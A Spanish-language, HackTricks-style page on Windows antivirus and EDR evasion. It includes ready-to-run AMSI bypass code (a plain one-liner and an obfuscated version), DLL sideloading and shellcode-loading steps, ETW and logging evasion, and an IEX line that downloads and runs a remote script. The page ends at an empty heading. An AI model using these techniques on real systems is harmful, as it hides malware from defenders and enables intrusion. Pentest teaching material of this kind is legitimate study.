# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Detener Windows Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para detener Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para detener Windows Defender simulando otro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Actualmente, los AVs usan diferentes métodos para comprobar si un archivo es malicioso o no: static detection, dynamic analysis, y para los EDRs más avanzados, behavioural analysis.

### **Static detection**

Static detection se logra marcando cadenas conocidas maliciosas o arrays de bytes en un binario o script, y también extrayendo información del propio archivo (p. ej. file description, company name, digital signatures, icon, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te detecten más fácilmente, ya que probablemente ya fueron analizadas y marcadas como maliciosas. Hay un par de formas de evitar este tipo de detección:

- **Encryption**

Si encriptas el binario, no habrá forma para que el AV detecte tu programa, pero necesitarás algún tipo de loader para desencriptar y ejecutar el programa en memoria.

- **Obfuscation**

A veces todo lo que necesitas es cambiar algunas cadenas en tu binario o script para pasar el AV, pero esto puede ser una tarea que consuma mucho tiempo dependiendo de lo que intentes ofuscar.

- **Custom tooling**

Si desarrollas tus propias herramientas, no habrá firmas malas conocidas, pero esto requiere mucho tiempo y esfuerzo.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Te recomiendo revisar esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion práctica.

### **Dynamic analysis**

Dynamic analysis es cuando el AV ejecuta tu binario en una sandbox y vigila actividad maliciosa (p. ej. intentar desencriptar y leer las contraseñas del navegador, realizar un minidump de LSASS, etc.). Esta parte puede ser un poco más difícil de sortear, pero aquí hay algunas cosas que puedes hacer para evadir sandboxes.

- **Sleep before execution** Dependiendo de cómo esté implementado, puede ser una gran forma de bypassear el dynamic analysis de los AVs. Los AVs tienen un tiempo muy corto para escanear archivos para no interrumpir el flujo de trabajo del usuario, así que usar sleeps largos puede alterar el análisis de binarios. El problema es que muchas sandboxes de AVs pueden simplemente saltarse el sleep dependiendo de cómo esté implementado.
- **Checking machine's resources** Usualmente las Sandboxes tienen muy pocos recursos para trabajar (p. ej. < 2GB RAM), de lo contrario podrían ralentizar la máquina del usuario. También puedes ser muy creativo aquí, por ejemplo comprobando la temperatura del CPU o incluso las velocidades del ventilador, no todo estará implementado en la sandbox.
- **Machine-specific checks** Si quieres apuntar a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes hacer una comprobación del dominio del equipo para ver si coincide con el que especificaste; si no coincide, puedes hacer que tu programa salga.

Resulta que el nombre de equipo de la Sandbox de Microsoft Defender es HAL9TH, así que puedes comprobar el nombre del equipo en tu malware antes de la detonación; si el nombre coincide con HAL9TH, significa que estás dentro de la sandbox de Defender, por lo que puedes hacer que tu programa salga.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fuente: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algunos otros muy buenos consejos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentarse a Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev canal</p></figcaption></figure>

Como hemos dicho antes en esta publicación, **public tools** eventualmente **get detected**, así que deberías hacerte una pregunta:

Por ejemplo, si quieres volcar LSASS, **¿realmente necesitas usar mimikatz**? ¿O podrías usar otro proyecto menos conocido que también dumpee LSASS?

La respuesta correcta probablemente sea la segunda. Tomando a mimikatz como ejemplo, probablemente sea uno de los, si no el más marcado por AVs y EDRs; aunque el proyecto en sí es genial, también es una pesadilla cuando quieres evitar AVs, así que busca alternativas para lo que intentas lograr.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in Defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Siempre que sea posible, **prioriza usar DLLs para evadir**, en mi experiencia, los archivos DLL suelen ser **mucho menos detectados** y analizados, por lo que es un truco muy simple para evitar la detección en algunos casos (si tu payload tiene alguna forma de ejecutarse como DLL, por supuesto).

Como podemos ver en esta imagen, un DLL Payload de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que el payload EXE tiene una tasa de detección de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparación en antiscan.me de un payload EXE normal de Havoc frente a un DLL normal de Havoc</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## DLL Sideloading & Proxying

**DLL Sideloading** aprovecha el orden de búsqueda de DLLs usado por el loader posicionando la aplicación víctima y el(s) payload(s) malicioso(s) uno al lado del otro.

Puedes buscar programas susceptibles a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) y el siguiente powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Te recomiendo encarecidamente que **explore DLL Hijackable/Sideloadable programs yourself**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas DLL Sideloadable públicamente conocidos, puedes ser detectado fácilmente.

Simplemente colocar una DLL maliciosa con el nombre que el programa espera cargar no hará que se ejecute tu payload, ya que el programa espera funciones específicas dentro de esa DLL. Para solucionar este problema, usaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** reenvía las llamadas que hace un programa desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y permitiendo manejar la ejecución de tu payload.

Voy a usar el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
El último comando nos dará 2 archivos: una plantilla de código fuente para la DLL, y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como el proxy DLL tienen una tasa de detección 0/26 en [antiscan.me](https://antiscan.me)! Lo llamaría un éxito.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Abusar de Forwarded Exports (ForwardSideLoading)

Los módulos PE de Windows pueden exportar funciones que en realidad son "forwarders": en lugar de apuntar a código, la entrada de exportación contiene una cadena ASCII de la forma `TargetDll.TargetFunc`. Cuando un caller resuelve la exportación, el loader de Windows hará:

- Cargar `TargetDll` si aún no está cargado
- Resolver `TargetFunc` desde él

Comportamientos clave a entender:
- Si `TargetDll` es un KnownDLL, se suministra desde el espacio de nombres protegido KnownDLLs (p. ej., ntdll, kernelbase, ole32).
- Si `TargetDll` no es un KnownDLL, se utiliza el orden normal de búsqueda de DLL, que incluye el directorio del módulo que está realizando la resolución del forward.

Esto habilita una primitiva de sideloading indirecta: encuentra un DLL firmado que exporte una función reenviada a un nombre de módulo que no sea KnownDLL, luego coloca ese DLL firmado junto a un DLL controlado por el atacante con el nombre exacto del módulo destino reenviado. Cuando se invoca la exportación reenviada, el loader resuelve el forward y carga tu DLL desde el mismo directorio, ejecutando tu DllMain.

Ejemplo observado en Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
NCRYPTPROV.dll no es una KnownDLL, así que se resuelve mediante el orden de búsqueda normal.

PoC (copiar y pegar):
1) Copiar la DLL del sistema firmada a una carpeta con permisos de escritura
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloca un `NCRYPTPROV.dll` malicioso en la misma carpeta. Un DllMain mínimo es suficiente para obtener ejecución de código; no necesitas implementar la función reenviada para desencadenar DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Activar el reenvío con un LOLBin firmado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (firmado) carga el side-by-side `keyiso.dll` (firmada)
- Mientras resuelve `KeyIsoSetAuditingInterface`, el cargador sigue el forward a `NCRYPTPROV.SetAuditingInterface`
- El cargador entonces carga `NCRYPTPROV.dll` desde `C:\test` y ejecuta su `DllMain`
- Si `SetAuditingInterface` no está implementada, obtendrás un error "missing API" solo después de que `DllMain` ya se haya ejecutado

Hunting tips:
- Concéntrate en los forwarded exports donde el módulo objetivo no es un KnownDLL. KnownDLLs están listados en `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puedes enumerar los forwarded exports con herramientas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitorea LOLBins (p. ej., rundll32.exe) cargando DLLs firmadas desde rutas no del sistema, seguidas por la carga de non-KnownDLLs con el mismo nombre base desde ese directorio
- Alerta sobre cadenas proceso/módulo como: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` en rutas escribibles por usuarios
- Aplica políticas de integridad de código (WDAC/AppLocker) y deniega escritura y ejecución en los directorios de aplicaciones

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puedes usar Freeze para cargar y ejecutar tu shellcode de manera sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es solo un juego del gato y el ratón; lo que funciona hoy podría detectarse mañana, así que nunca confíes en una sola herramienta; si es posible, intenta encadenar múltiples técnicas de evasión.

## AMSI (Anti-Malware Scan Interface)

AMSI fue creado para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los AV solo eran capaces de escanear **archivos en disco**, por lo que si de alguna manera podías ejecutar payloads **directly in-memory**, el AV no podía hacer nada para evitarlo, ya que no tenía suficiente visibilidad.

La característica AMSI está integrada en estos componentes de Windows.

- User Account Control, or UAC (elevación de EXE, COM, MSI, o instalación de ActiveX)
- PowerShell (scripts, uso interactivo y evaluación dinámica de código)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Permite que las soluciones antivirus inspeccionen el comportamiento de los scripts exponiendo su contenido de manera no cifrada y no ofuscada.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observa cómo antepone `amsi:` y luego la ruta al ejecutable desde el cual se ejecutó el script; en este caso, powershell.exe

No dejamos ningún archivo en disco, pero aun así fuimos detectados in-memory debido a AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Por eso se recomienda usar versiones inferiores de .NET (como 4.7.2 o anteriores) para la ejecución in-memory si quieres evadir AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Dado que AMSI funciona principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena forma de evadir la detección.

Sin embargo, AMSI tiene la capacidad de desofuscar scripts incluso si tienen múltiples capas, por lo que la obfuscation podría ser una mala opción dependiendo de cómo se haga. Esto hace que no sea tan sencillo evadirlo. Aunque, a veces, todo lo que necesitas es cambiar un par de nombres de variables y estarás bien, así que depende de cuánto esté marcado algo.

- **AMSI Bypass**

Dado que AMSI se implementa cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularla fácilmente incluso ejecutando como un usuario sin privilegios. Debido a este fallo en la implementación de AMSI, los investigadores han encontrado múltiples maneras de evadir el escaneo de AMSI.

**Forcing an Error**

Forzar que la inicialización de AMSI falle (amsiInitFailed) provocará que no se inicie ningún escaneo para el proceso actual. Originalmente esto fue divulgado por [Matt Graeber](https://twitter.com/mattifestation) y Microsoft ha desarrollado una firma para evitar un uso más amplio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Todo lo que hizo falta fue una línea de código de powershell para dejar AMSI inutilizable para el proceso de powershell actual. Esta línea, por supuesto, fue marcada por AMSI, así que se necesita alguna modificación para poder usar esta técnica.

Aquí hay un AMSI bypass modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Ten en cuenta que esto probablemente será marcado una vez que este post se publique, por lo que no deberías publicar ningún código si tu intención es permanecer sin ser detectado.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Por favor lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Bloqueando AMSI impidiendo la carga de amsi.dll (LdrLoadDll hook)

AMSI se inicializa solo después de que `amsi.dll` se carga en el proceso actual. Un bypass robusto e independiente del lenguaje consiste en colocar un user‑mode hook en `ntdll!LdrLoadDll` que devuelva un error cuando el módulo solicitado sea `amsi.dll`. Como resultado, AMSI nunca se carga y no se realizan escaneos para ese proceso.

Esquema de implementación (x64 C/C++ pseudocódigo):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona en PowerShell, WScript/CScript y custom loaders por igual (cualquier cosa que de otro modo cargaría AMSI).
- Úsalo junto con pasar scripts por stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefactos largos en la línea de comandos.
- Visto usado por loaders ejecutados a través de LOLBins (p. ej., `regsvr32` llamando `DllRegisterServer`).

Esta herramienta [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) también genera scripts para evadir AMSI.

**Eliminar la firma detectada**

Puedes usar una herramienta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** y **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para eliminar la firma AMSI detectada de la memoria del proceso actual. Esta herramienta funciona escaneando la memoria del proceso actual en busca de la firma AMSI y luego sobrescribiéndola con instrucciones NOP, eliminándola efectivamente de la memoria.

**Productos AV/EDR que usan AMSI**

Puedes encontrar una lista de productos AV/EDR que usan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usar PowerShell versión 2**
Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin ser escaneados por AMSI. Puedes hacer esto:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging es una característica que permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para auditoría y resolución de problemas, pero también puede ser un **problema para atacantes que quieren evadir la detección**.

Para eludir PowerShell logging, puedes usar las siguientes técnicas:

- **Disable PowerShell Transcription and Module Logging**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Use Powershell version 2**: Si usas PowerShell versión 2, AMSI no se cargará, así que puedes ejecutar tus scripts sin que sean escaneados por AMSI. Puedes hacerlo: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para crear un powershell without defenses (esto es lo que `powerpick` from Cobal Strike usa).


## Ofuscación

> [!TIP]
> Varias técnicas de ofuscación se basan en encriptar datos, lo que aumentará la entropía del binario y facilitará que AVs and EDRs lo detecten. Ten cuidado con esto y quizá aplica encriptación solo a secciones específicas de tu código que sean sensibles o necesiten ser ocultadas.

### Desofuscando binarios .NET protegidos por ConfuserEx

Al analizar malware que usa ConfuserEx 2 (o forks comerciales) es común encontrarse con varias capas de protección que bloquearán descompiladores y sandboxes. El siguiente flujo de trabajo restaura de forma fiable un IL casi original que luego puede descompilarse a C# en herramientas como dnSpy o ILSpy.

1.  Eliminación de anti-tampering – ConfuserEx encripta cada *method body* y lo desencripta dentro del constructor estático del *module* (`<Module>.cctor`). Esto también parchea el PE checksum, por lo que cualquier modificación hará que el binario se bloquee. Usa **AntiTamperKiller** para localizar las tablas de metadatos encriptadas, recuperar las claves XOR y reescribir un ensamblado limpio:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La salida contiene los 6 parámetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que pueden ser útiles al construir tu propio unpacker.

2.  Recuperación de símbolos / flujo de control – pasa el archivo *clean* a **de4dot-cex** (un fork de de4dot con soporte para ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleccionar el perfil de ConfuserEx 2  
• de4dot deshará el aplanamiento del flujo de control, restaurará los namespaces, clases y nombres de variables originales y desencriptará cadenas constantes.

3.  Eliminación de proxy-calls – ConfuserEx reemplaza llamadas directas a métodos con wrappers ligeros (también conocidos como *proxy calls*) para romper aún más la descompilación. Elimínalos con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Después de este paso deberías observar APIs normales de .NET como `Convert.FromBase64String` o `AES.Create()` en lugar de funciones wrapper opacas (`Class8.smethod_10`, …).

4.  Limpieza manual – ejecuta el binario resultante en dnSpy, busca grandes blobs Base64 o el uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar la carga útil *real*. A menudo el malware la almacena como un arreglo de bytes codificado TLV inicializado dentro de `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin** necesidad de ejecutar la muestra maliciosa — útil cuando se trabaja en una estación de trabajo offline.

> 🛈  ConfuserEx produce un atributo personalizado llamado `ConfusedByAttribute` que puede usarse como IOC para triage automático de muestras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork open-source del compilador [LLVM](http://www.llvm.org/) capaz de ofrecer una mayor seguridad de software mediante [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin usar ninguna herramienta externa y sin modificar el compilador.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de operaciones ofuscadas generadas por el framework de template metaprogramming de C++ que hará la vida un poco más difícil a la persona que quiera crackear la aplicación.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un obfuscator de binarios x64 capaz de ofuscar varios tipos de archivos PE incluyendo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un simple motor de código metamórfico para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un framework de obfuscación de código fino para lenguajes soportados por LLVM que usa ROP (return-oriented programming). ROPfuscator ofusca un programa a nivel de código ensamblador transformando instrucciones regulares en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un .NET PE Crypter escrito en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Comprobando el Zone.Identifier ADS de un archivo descargado de internet.</p></figcaption></figure>

> [!TIP]
> Es importante notar que los ejecutables firmados con un certificado de firma **trusted** **no activarán SmartScreen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un potente mecanismo de registro en Windows que permite a las aplicaciones y componentes del sistema **registrar eventos**. Sin embargo, también puede ser usado por productos de seguridad para monitorizar y detectar actividades maliciosas.

De manera similar a cómo se deshabilita (bypassea) AMSI, también es posible hacer que la función de espacio de usuario **`EtwEventWrite`** devuelva de inmediato sin registrar ningún evento. Esto se hace parcheando la función en memoria para que retorne inmediatamente, deshabilitando efectivamente el registro ETW para ese proceso.

Puedes encontrar más información en **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Cargar binarios C# en memoria es conocido desde hace tiempo y sigue siendo una excelente forma de ejecutar tus herramientas de post-exploitation sin ser detectado por AV.

Dado que el payload se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.

La mayoría de los C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya proporcionan la capacidad de ejecutar C# assemblies directamente en memoria, pero hay diferentes formas de hacerlo:

- **Fork\&Run**

Implica **lanzar un nuevo proceso sacrificial**, inyectar tu código malicioso de post-exploitation en ese nuevo proceso, ejecutar tu código malicioso y cuando termine, matar el nuevo proceso. Esto tiene tanto ventajas como desventajas. La ventaja del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso Beacon implantado. Esto significa que si algo en nuestra acción de post-exploitation sale mal o es detectado, hay una **mucho mayor probabilidad** de que nuestro **implant sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser detectado por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Se trata de inyectar el código malicioso de post-exploitation **en su propio proceso**. De este modo, puedes evitar crear un nuevo proceso y que este sea escaneado por AV, pero la desventaja es que si algo sale mal durante la ejecución de tu payload, hay una **mucho mayor probabilidad** de **perder tu beacon** ya que podría colapsar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si quieres leer más sobre C# Assembly loading, revisa este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

También puedes cargar C# Assemblies **desde PowerShell**, mira Invoke-SharpLoader (https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y el video de S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Como se propone en [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso usando otros lenguajes dando a la máquina comprometida acceso **al entorno del intérprete instalado en el Attacker Controlled SMB share**.

Al permitir el acceso a los Interpreter Binaries y al entorno en el SMB share puedes **ejecutar código arbitrario en estos lenguajes dentro de la memoria** de la máquina comprometida.

El repo indica: Defender aún escanea los scripts pero al utilizar Go, Java, PHP, etc. tenemos **más flexibilidad para evadir firmas estáticas**. Probar con shells reversos aleatorios no ofuscados en estos lenguajes ha resultado exitoso.

## TokenStomping

